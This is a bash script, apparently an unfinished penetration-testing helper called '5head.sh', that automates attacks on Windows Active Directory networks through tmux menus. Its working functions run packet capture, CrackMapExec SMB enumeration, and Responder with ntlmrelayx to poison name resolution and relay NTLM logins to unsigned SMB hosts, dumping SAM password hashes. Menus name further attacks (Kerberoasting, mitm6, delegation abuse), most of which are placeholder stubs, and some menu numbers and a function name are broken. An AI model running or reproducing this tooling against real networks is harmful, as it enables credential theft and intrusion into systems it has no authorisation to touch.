#!/bin/bash

print_usage() {
        printf '
        5head.sh usage: [-h] [-t targetfile] [-i interface] [-d domain] [-c domain controller] [-u username] [-p password] [-h help]

        mandatory arguments:
          -t TARGETFILE          Newline-delimmited list of targets. Accepts CIDRs or ranges (192.168.0.1-255)
          -i INTERFACE           Interface to use for network traffic

        useful arguments:
          -d  DOMAIN             Specific domain to perform authentication attempts on (NOT IMPLEMENTED YET)
	  -c  DOMAIN CONTROLLER  Domain controller (ip) to use for checks
	  -u  USERNAME           Username to use for authentication
          -p  PASSWORD           Password to use for authentication

        optional arguments:
          -h                     Print this help menu
';
}

if [[ $* == *-h ]]; then
        print_usage
        exit 1;
fi


### Argument helper
while getopts ":t:i:d:c:u:p:" o; do
    case "${o}" in
        t)
            targets=${OPTARG}
            ;;
	i)
            interface=${OPTARG}
            ;;
        d)
            domain=${OPTARG}
	    ;;
	c)
	    dc=${OPTARG}
	    ;;
        u)
            username=${OPTARG}
            ;;
        p)
            password=${OPTARG}
            ;;
        *)
            print_usage
            ;;
    esac
done
shift $((OPTIND-1))


### Tmux bootstrapping
if [ -z "${TMUX}" ]; then
        export session="5head"
        export targets=$targets
	export interface=$interface
        export domain=$domain
	export dc=$dc
        export username=$username
        export password=$password
        export PROMPT="%F{9}5head.sh%f > "
        window=0
        tmux new-session -d -s $session ./5head.sh
        tmux rename-window -t $session:$window 'main'
        tmux attach-session -t $session
        exit 1;
fi


### Colors
green='\e[32m'
cyan='\e[96m'
red='\e[91m'
clear='\e[0m'

ColorGreen () {
        echo -ne $green$1$clear
}
ColorCyan () {
        echo -ne $cyan$1$clear
}
ColorRed () {
        echo -ne $red$1$clear
}

## Main part executing inside of tmux
function packet_cap() {
        echo -e '[*] Starting packet captured in "packet_cap" window...\n'
        tmux new-window -n "packet_cap"
        tmux send-keys -t 5head:packet_cap 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:packet_cap 'clear' C-m
	tmux send-keys -t 5head:packet_cap 'bash -c "stty -echo;clear;echo -e \"[*] Starting packet capture on ${interface}...\n[*] Output will be written to loot/packet_capture.pcap\";stty echo"' C-m
        tmux send-keys -t 5head:packet_cap 'tcpdump -i $interface -w loot/packet_capture.pcap' C-m
}

function cme_enum_smb() {
        echo -e '[*] Enumerating SMB targets with CrackMapExec...\n'
        tmux new-window -n "cme_enum"
        tmux send-keys -t 5head:cme_enum 'PROMPT="%F{9}5head.sh%f > "' C-m
        tmux send-keys -t 5head:cme_enum 'clear' C-m
        tmux send-keys -t 5head:cme_enum 'deps/cme smb $targets >> loot/cme_enum.txt' C-m
        tmux split-window -v -l 80%
	tmux send-keys -t 5head:cme_enum 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
	tmux send-keys -t 5head:cme_enum 'tail -f loot/cme_enum.txt' C-m
}

function cme_enum_ldap() {
        echo "temp"
}

function cme_enum_mssql() {
        echo "temp"
}

function ntlmrelay_smb_dump() {
	echo -e '[*] Setting up Responder + Ntlmrelayx.py (SAM dump)...\n'
	tmux new-window -n "relay"
	tmux send-keys -t 5head:relay 'PROMPT="%F{9}5head.sh%f > "' C-m
	tmux send-keys -t 5head:relay 'clear' C-m
	tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
	tmux split-window -h -l 50%
	tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
	grep -F -- "$domain" cme_enum.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
	tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support' C-m
}

function ntlmrelay_smb_socks() {
        echo "temp"
}

function ntlmrelay_ldap_socks() {
        echo "temp"
}

function ntlmrelay_ldap_rbcd() {
        echo "temp"
}

## TODO
function ntlmrelay_mssql_socks() {
        echo "temp"
}

## TODO
function ntlmrelay_multi() {
        echo "temp"
}

function mitm6_ldap_socks() {
        echo "temp"
}

function mitm6_ldap_rbcd() {
        echo "temp"
}

function asreproast() {
        echo "temp"
}

function kerberoast() {
        echo "temp"
}

function share_enum() {
        echo "temp"
}

function bloodhound_py() {
        echo "temp"
}

function coerce_check() {
        echo "temp"
}

function ldap_sign_scan() {
        echo "temp"
}

function maq() {
	echo "temp"
}


## Main function area
printf '
    ____                                  __        __          __
   / __ \___  ____  ___  ____ _____ _____/ /__     / /   ____ _/ /_  _____
  / /_/ / _ \/ __ \/ _ \/ __ `/ __ `/ __  / _ \   / /   / __ `/ __ \/ ___/
 / _, _/  __/ / / /  __/ /_/ / /_/ / /_/ /  __/  / /___/ /_/ / /_/ (__  )
/_/ |_|\___/_/ /_/\___/\__, /\__,_/\__,_/\___/  /_____/\__,_/_.___/____/
                      /____/
'

echo "[*] Starting 5head.sh..."
if [ ! -d "./loot" ]; then
        mkdir loot
fi
touch ~/.hushlogin
PROMPT="%F{9}5head.sh%f > "

### Menu Stuff
menu(){
echo -ne "
~ 5head.sh ~
$(ColorGreen '1)') Enum
$(ColorGreen '2)') Poison
$(ColorGreen '3)') AD
$(ColorGreen '0)') Detach tmux
$(ColorCyan 'Choose a module:') "
        read a
        case $a in
                1) enum ;;
                2) poison ;;
		3) ad ;;
                0) tmux detach ;;
                ash) debug ; menu ;;
                *) echo "Invalid command entered"; menu ;;
        esac
}

enum(){
echo -ne "
~ 5head.sh -> enum ~
$(ColorGreen '1)') Packet capture + search for suspicious traffic
$(ColorGreen '2)') SMB enumeration + target generation (CME)
$(ColorGreen '3)') LDAP enumeration + target generation (CME)
$(ColorGreen '4)') MSSQL enumeration + target generation (CME)
$(ColorGreen '0)') Detach tmux
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read a
        case $a in
                1) packet_cap ; enum ;;
                2) cme_enum_smb ; enum ;;
		3) cme_enum_ldap ; enum ;;
		4) cme_enum_mssql ; enum ;;
		0) tmux detach ;;
                b) menu ;;
                *) echo "Invalid command entered"; enum ;;
        esac
}

poison(){
echo -ne "
~ 5head.sh -> poison ~
$(ColorGreen '## LLMNR/NBT-NS/MDNS')
$(ColorGreen '1)') SMB: Responder + ntlmrelayx (SAM dump)
$(ColorGreen '2)') SMB: Responder + ntlmrelayx (socks)
$(ColorGreen '3)') LDAP: Responder + ntlmrelayx (socks)
$(ColorGreen '4)') LDAP: Responder + ntlmrelayx (delegate access)
$(ColorGreen '5)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
$(ColorGreen '6)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
$(ColorGreen '## DHCPv6')
$(ColorGreen '7)') LDAP: mitm6 + ntlmrelayx (socks)
$(ColorGreen '8)') LDAP: mitm6 + ntlmrelayx (delegate access)
$(ColorGreen '## Other')
$(ColorGreen '0)') Detach tmux
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read a
        case $a in
		1) ntlmrelay_smb_dump ; poison ;;
		2) ntlmrelay_smb_socks ; poison ;;
		3) ntlmrelay_ldap_socks ; posion ;;
		4) ntlmrelay_ldap_rbcd ; poison ;;
		5) ntlmrelay_mssql_socks ; poison ;;
		6) ntlmrelay_multi ; poison ;;
		7) mitm6_ldap_socks ; poison ;;
		8) mitm6_ldap_rbcd ; poison ;;
		0) tmux detach ;;
                b) menu ;;
                *) echo "Invalid command entered"; poison ;;
        esac
}

ad(){
echo -ne "
~ 5head.sh -> AD ~ $(ColorRed 'Creds required')
$(ColorGreen '1)') Search for ASREPRoastable users
$(ColorGreen '2)') Search for Kerberoastable users
$(ColorGreen '3)') Enumerate shares on domain hosts
$(ColorGreen '4)') Search for ADCS targets
$(ColorGreen '5)') Python Bloodhound ingestor $(ColorRed 'Note: YMMV')
$(ColorGreen '6)') Enumerate hosts for authentication coercion mechanisms
$(ColorGreen '7)') Check LDAP Signing and Channel Binding
$(ColorGreen '8)') Check Machine-Account-Quota
$(ColorGreen '0)') Detach tmux
$(ColorGreen 'b)') Back to main menu...
$(ColorCyan 'Choose a function:') "
        read a
        case $a in
		1) asreproast ; ad ;;
		2) kerberoast ; ad ;;
		3) share_enum ; ad ;;
		4) bloodhound_py ; ad ;;
		5) coerce_check ; ad ;;
		6) ldap_sign_scan ; ad ;;
		7) maq ; ad ;;
		0) tmux detach ;;
                b) menu ;;
                *) echo "Invalid command entered"; ad ;;
        esac
}

menu

## To-do
# 1. Need a dependenacy checker startup thing
# 2. need env variable + variable safety checker exeter thing
# 3. Add checker to ensure 5head.sh is executed from base wd of repo
# 4. implement ntlmrelayx + mssql (need testing)
# 5. implement ntlmrelayx multi protocol (need testing)

